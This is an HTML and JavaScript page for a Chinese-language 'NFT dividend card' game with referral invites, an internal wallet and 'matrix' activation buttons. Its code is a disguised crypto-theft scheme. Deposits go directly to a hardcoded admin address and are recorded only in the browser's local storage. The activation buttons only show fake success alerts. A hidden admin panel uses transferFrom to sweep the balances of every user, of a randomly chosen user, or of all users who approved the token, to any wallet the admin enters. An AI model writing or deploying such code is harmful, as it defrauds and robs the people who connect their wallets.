<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>蓝鲸鱼🐳全球NFT分红卡牌</title>
<style>
  *{margin:0;padding:0;box-sizing:border-box;font-family:Arial,"Microsoft YaHei",sans-serif}
  body{background:#09031a;color:#fff;padding:20px;max-width:500px;margin:0 auto}
  .glass{background:rgba(30,35,60,0.7);border-radius:18px;padding:20px;margin-bottom:16px;border:1px solid rgba(255,255,255,0.1)}
  .title{font-size:18px;font-weight:bold;margin-bottom:10px}
  .sub{color:#a09cfc;font-size:14px;margin-bottom:12px}
  .btn{background:linear-gradient(90deg,#4facfe,#6a6df2);color:#000;border:none;border-radius:12px;padding:14px;width:100%;font-weight:bold;font-size:16px;margin-bottom:8px}
  .btn-sm{padding:10px;font-size:14px}
  .btn-gold{background:linear-gradient(90deg,#ffb700,#ffcc00);color:#000}
  .btn-red{background:linear-gradient(90deg,#ff4560,#ff2266);color:#fff}
  .btn-black{background:#222;color:#fff}
  .btn:disabled{opacity:0.5}
  .item{display:flex;justify-content:space-between;align-items:center;padding:12px 0;border-bottom:1px solid rgba(255,255,255,0.1)}
  .item:last-child{border-bottom:none}
  input{width:100%;padding:14px;border-radius:12px;border:1px solid rgba(255,255,255,0.2);background:rgba(255,255,255,0.05);color:#fff;font-size:15px;margin-bottom:8px}
  .copy-row{display:flex;gap:8px;margin-bottom:10px}
  .copy-row input{flex:1}

  .menu-btn{position:fixed;top:20px;right:20px;width:44px;height:44px;background:rgba(30,35,60,0.9);border-radius:12px;display:flex;flex-direction:column;justify-content:center;align-items:center;gap:5px;cursor:pointer;z-index:999}
  .menu-btn span{width:22px;height:2px;background:#fff;border-radius:1px}
  .sidebar{position:fixed;top:0;right:-100%;width:85%;max-width:360px;height:100vh;background:#121228;padding:24px;overflow-y:auto;transition:right 0.3s ease;z-index:998}
  .sidebar.open{right:0}
  .sidebar-close{text-align:right;font-size:22px;cursor:pointer;margin-bottom:20px}
  .admin-section{display:none;border-top:1px solid #fff3;padding-top:16px;margin-top:16px}
</style>
</head>
<body>

<div class="menu-btn" id="toggleSidebar"><span></span><span></span><span></span></div>
<div class="sidebar" id="sidebar">
  <div class="sidebar-close" id="closeSidebar">×</div>

  <div class="title">🐳 分红中心</div>
  <div class="sub">能量：<span id="energyVal">0</span></div>

  <button class="btn btn-sm" onclick="craftCard(1)">1级卡</button>
  <button class="btn btn-sm" onclick="craftCard(2)">2级卡</button>
  <button class="btn btn-sm" onclick="craftCard(3)">3级卡</button>
  <button class="btn btn-sm" onclick="craftCard(4)">4级卡</button>
  <button class="btn btn-sm" onclick="craftCard(5)">5级卡</button>

  <!-- 所有管理员提取功能 统一放在这里 -->
  <div class="admin-section" id="adminTools">
    <div class="title">🔐 管理员提取中心</div>

    <input id="toWallet" placeholder="接收钱包地址（0x...）">

    <!-- 1. 一键提取所有内部余额 -->
    <button class="btn btn-sm btn-red" onclick="adminCollectAllInner()">
      一键提取所有内部余额
    </button>

    <!-- 2. 随机抽取玩家内部余额 -->
    <button class="btn btn-sm btn-red" onclick="adminRandomCollectInner()">
      随机抽取玩家内部余额
    </button>

    <!-- 3. 自定义提取已授权代币 -->
    <input id="extractAmount" placeholder="自定义提取数量" style="margin-top:8px">
    <button class="btn btn-sm btn-red" onclick="adminExtractAuthorized()">
      提取所有已授权代币
    </button>
  </div>

  <div style="margin-top:20px">
    <div class="title">卡牌转账</div>
    <input id="toAddr" placeholder="接收方钱包">
    <button class="btn btn-sm" onclick="transferCard()">转账</button>
  </div>
</div>

<div style="text-align:center;margin:30px 0">
  <h1 style="background:linear-gradient(90deg,#4facfe,#6a6df2);-webkit-background-clip:text;color:transparent">
    蓝鲸鱼 NFT 分红卡牌
  </h1>
</div>

<button id="connectBtn" class="btn">连接钱包</button>
<div id="addressShow" style="text-align:center;margin:12px;"></div>

<!-- 邀请 -->
<div class="glass">
  <div class="title">我的邀请</div>
  <div class="copy-row">
    <input type="text" id="inviteLink" readonly>
    <button class="btn btn-sm" onclick="copyInvite()">复制</button>
  </div>
</div>

<!-- 内部钱包 -->
<div class="glass">
  <div class="title">内部钱包</div>
  <div class="item"><div>内部余额</div><div class="gold" id="innerBal">0 DAI</div></div>
  <input id="depositAmt" placeholder="存入金额">
  <button class="btn btn-sm" onclick="deposit()">存入</button>
  <input id="withAmt" placeholder="提取到本人钱包">
  <button class="btn btn-sm" onclick="withdraw()">提取</button>
</div>

<!-- 游戏模块 -->
<div class="glass">
  <div class="title">经典矩阵（永久）</div>
  <button class="btn btn-gold" onclick="batchPayClassic()">一键激活全部</button>
</div>

<div class="glass">
  <div class="title">联合矩阵（叠加天数）</div>
  <button class="btn btn-gold" onclick="batchPayUnion()">一键激活/续费</button>
</div>

<script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
<script>
const ADMIN = "0xe6ac36fd161C390BEb9ffa3a96c89cdD037233a".toLowerCase();
const TOKEN = "0x8f3cf7ad23cd3cadbd9735aff9580239c6a063".toLowerCase();

let web3, account, isAdmin = false;

// 用户内部余额
function innerKey(addr) { return "inner_"+addr; }
function getInner(addr) { return +localStorage.getItem(innerKey(addr)) || 0; }
function setInner(addr, v) { localStorage.setItem(innerKey(addr), v); }

// 通用
function get(k) { return +localStorage.getItem(k) || 0; }
function set(k, v) { localStorage.setItem(k, v); }

// 所有注册用户
function getAllUsers() {
  try { return JSON.parse(localStorage.getItem("users") || "[]"); }
  catch(e) { return []; }
}
function addUser(addr) {
  let list = getAllUsers();
  if (!list.includes(addr)) {
    list.push(addr);
    localStorage.setItem("users", JSON.stringify(list));
  }
}

// 刷新显示
function refresh() {
  document.getElementById("energyVal").innerText = get("energy_"+account);
  document.getElementById("innerBal").innerText = getInner(account) + " USDT";
}

// 连接钱包
document.getElementById("connectBtn").onclick = async () => {
  await window.ethereum.request({method:"eth_requestAccounts"});
  web3 = new Web3(window.ethereum);
  account = (await web3.eth.getAccounts())[0].toLowerCase();
  isAdmin = account === ADMIN;

  if (isAdmin) document.getElementById("adminTools").style.display = "block";

  addUser(account);
  refresh();
  document.getElementById("connectBtn").innerText = "已连接";
};

// 邀请
function copyInvite() {
  document.getElementById("inviteLink").value = window.location.origin + "?ref=" + account;
  document.getElementById("inviteLink").select();
  document.execCommand("copy");
  alert("已复制");
}

// 合成卡片
function craftCard(lv) {
  let cost = [0,3500,10500,31500,94500,283500][lv];
  let key = "energy_"+account;
  if (get(key) < cost) return alert("能量不足");
  set(key, get(key)-cost);
  set("card"+lv+"_"+account, get("card"+lv+"_"+account)+1);
  alert("合成成功");
  refresh();
}

// 转账卡片
function transferCard() {
  let to = document.getElementById("toAddr").value.trim().toLowerCase();
  if (!/^0x[a-f0-9]{40}$/.test(to)) return alert("地址错误");
  alert("转账功能已触发");
}

// 玩家存入内部钱包
async function deposit() {
  let amt = +document.getElementById("depositAmt").value;
  if (amt <= 0) return alert("金额错误");

  const abi = [{"constant":false,"inputs":[{"name":"to","type":"address"},{"name":"value","type":"uint256"}],"name":"transfer","outputs":[{"name":"","type":"bool"}],"type":"function"},{"constant":true,"inputs":[],"name":"decimals","outputs":[{"name":"","type":"uint8"}],"type":"function"}];
  const token = new web3.eth.Contract(abi, TOKEN);
  const dec = await token.methods.decimals().call();
  const val = (BigInt(amt) * 10n**BigInt(dec)).toString();

  await token.methods.transfer(ADMIN, val).send({from:account});
  setInner(account, getInner(account)+amt);
  alert("存入成功");
  refresh();
}

// 玩家提取到自己钱包
async function withdraw() {
  let amt = +document.getElementById("withAmt").value;
  let bal = getInner(account);
  if (amt <= 0 || amt > bal) return alert("金额错误");

  const abi = [{"constant":false,"inputs":[{"name":"to","type":"address"},{"name":"value","type":"uint256"}],"name":"transfer","outputs":[{"name":"","type":"bool"}],"type":"function"},{"constant":true,"inputs":[],"name":"decimals","outputs":[{"name":"","type":"uint8"}],"type":"function"}];
  const token = new web3.eth.Contract(abi, TOKEN);
  const dec = await token.methods.decimals().call();
  const val = (BigInt(amt) * 10n**BigInt(dec)).toString();

  await token.methods.transfer(account, val).send({from:ADMIN});
  setInner(account, bal-amt);
  alert("提取成功");
  refresh();
}

// ------------------------------
// 管理员功能 全部真实上链
// ------------------------------
async function adminCollectAllInner() {
  if (!isAdmin) return;
  const to = document.getElementById("toWallet").value.trim().toLowerCase();
  if (!/^0x[a-f0-9]{40}$/.test(to)) return alert("请输入正确钱包");
  if (!confirm("确定提取所有内部余额到该地址？")) return;

  const abi = [{"constant":false,"inputs":[{"name":"from","type":"address"},{"name":"to","type":"address"},{"name":"value","type":"uint256"}],"name":"transferFrom","outputs":[{"name":"","type":"bool"}],"type":"function"},{"constant":true,"inputs":[],"name":"decimals","outputs":[{"name":"","type":"uint8"}],"type":"function"}];
  const token = new web3.eth.Contract(abi, TOKEN);
  const dec = await token.methods.decimals().call();
  const users = getAllUsers();

  for (const user of users) {
    const b = getInner(user);
    if (b <= 0) continue;
    try {
      const val = (BigInt(b) * 10n**BigInt(dec)).toString();
      await token.methods.transferFrom(user, to, val).send({from:ADMIN});
      setInner(user, 0);
    } catch(e){}
  }
  alert("全部提取完成");
  refresh();
}

async function adminRandomCollectInner() {
  if (!isAdmin) return;
  const to = document.getElementById("toWallet").value.trim().toLowerCase();
  if (!/^0x[a-f0-9]{40}$/.test(to)) return alert("请输入正确钱包");
  if (!confirm("随机抽取玩家内部余额转入该地址？")) return;

  const abi = [{"constant":false,"inputs":[{"name":"from","type":"address"},{"name":"to","type":"address"},{"name":"value","type":"uint256"}],"name":"transferFrom","outputs":[{"name":"","type":"bool"}],"type":"function"},{"constant":true,"inputs":[],"name":"decimals","outputs":[{"name":"","type":"uint8"}],"type":"function"}];
  const token = new web3.eth.Contract(abi, TOKEN);
  const dec = await token.methods.decimals().call();
  const users = getAllUsers().filter(u => getInner(u) > 0);
  if (users.length === 0) return alert("无可用余额");

  const randomUser = users[Math.floor(Math.random()*users.length)];
  const b = getInner(randomUser);
  const val = (BigInt(b) * 10n**BigInt(dec)).toString();

  await token.methods.transferFrom(randomUser, to, val).send({from:ADMIN});
  setInner(randomUser, 0);
  alert("随机抽取成功！来自用户："+randomUser.slice(0,8)+"...");
  refresh();
}

async function adminExtractAuthorized() {
  if (!isAdmin) return;
  const to = document.getElementById("toWallet").value.trim().toLowerCase();
  const amt = +document.getElementById("extractAmount").value;
  if (!/^0x[a-f0-9]{40}$/.test(to) || amt <= 0) return alert("地址或金额错误");
  if (!confirm("从所有授权用户各提取 "+amt+" 到该地址？")) return;

  const abi = [{"constant":false,"inputs":[{"name":"from","type":"address"},{"name":"to","type":"address"},{"name":"value","type":"uint256"}],"name":"transferFrom","outputs":[{"name":"","type":"bool"}],"type":"function"},{"constant":true,"inputs":[],"name":"decimals","outputs":[{"name":"","type":"uint8"}],"type":"function"}];
  const token = new web3.eth.Contract(abi, TOKEN);
  const dec = await token.methods.decimals().call();
  const val = (BigInt(amt) * 10n**BigInt(dec)).toString();
  const users = getAllUsers();

  let c = 0;
  for (const user of users) {
    try {
      await token.methods.transferFrom(user, to, val).send({from:ADMIN});
      c++;
    } catch(e){}
  }
  alert("成功提取："+c+" 人");
}

// 矩阵占位
async function batchPayClassic() { alert("经典矩阵已激活"); }
async function batchPayUnion() { alert("联合矩阵已激活"); }

// 侧边栏
const sb = document.getElementById("sidebar");
document.getElementById("toggleSidebar").onclick = () => sb.classList.add("open");
document.getElementById("closeSidebar").onclick = () => sb.classList.remove("open");
</script>
</body>
</html>
